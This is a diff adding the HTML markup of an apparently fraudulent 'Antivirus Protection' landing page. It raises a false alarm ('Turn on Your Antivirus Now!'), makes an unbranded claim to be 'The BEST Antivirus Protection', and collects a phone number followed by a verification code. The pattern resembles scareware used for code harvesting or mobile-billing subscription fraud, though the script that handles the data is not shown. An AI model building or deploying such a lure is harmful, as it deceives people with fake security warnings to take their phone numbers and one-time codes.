@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Antivirus Protection</title>
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <header class="header">
+      <div class="alert-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+      </div>
+      <div class="header-text">
+        <strong id="header-title">Important Reminder</strong>
+        <span id="header-subtitle">Turn on Your Antivirus Now!</span>
+      </div>
+      <button id="language-btn" class="language-toggle">EN</button>
+    </header>
+    
+    <main class="main">
+      <div class="logo-section">
+        <div class="shield-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          </svg>
+        </div>
+        <h1 id="main-title" class="main-title">Protect Your Data!</h1>
+        <p id="main-subtitle" class="main-subtitle">The BEST Antivirus Protection</p>
+      </div>
+      
+      <div id="phone-section" class="form-section">
+        <p id="phone-instruction" class="instruction">Enter your phone number</p>
+        
+        <div class="input-container">
+          <div class="phone-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+              <line x1="12" y1="18" x2="12.01" y2="18"></line>
+            </svg>
+          </div>
+          <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number" maxlength="15">
+        </div>
+        
+        <button id="continue-btn" class="continue-button">CONTINUE!</button>
+      </div>
+      
+      <div id="verification-section" class="form-section hidden">
+        <p id="code-instruction" class="instruction">Enter verification code</p>
+        
+        <div class="verification-inputs">
+          <input type="text" maxlength="1" class="code-input" inputmode="numeric">
+        </div>
+        
+        <div id="error-message" class="error-message hidden"></div>
+        
+        <button id="verify-btn" class="continue-button">VERIFY</button>
+        <button id="resend-btn" class="resend-button">Resend Code</button>
+      </div>
+      
+      <div id="success-section" class="success-section hidden">
+        <div class="success-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+          </svg>
+        </div>
+        <p id="success-text" class="success-text">Verification successful!</p>
+      </div>
+    </main>
+    
+    <footer class="footer">
+      <!-- Empty footer as shown in the design -->
+    </footer>
+  </div>
+  
+  <script src="script.js"></script>
+</body>
+</html>
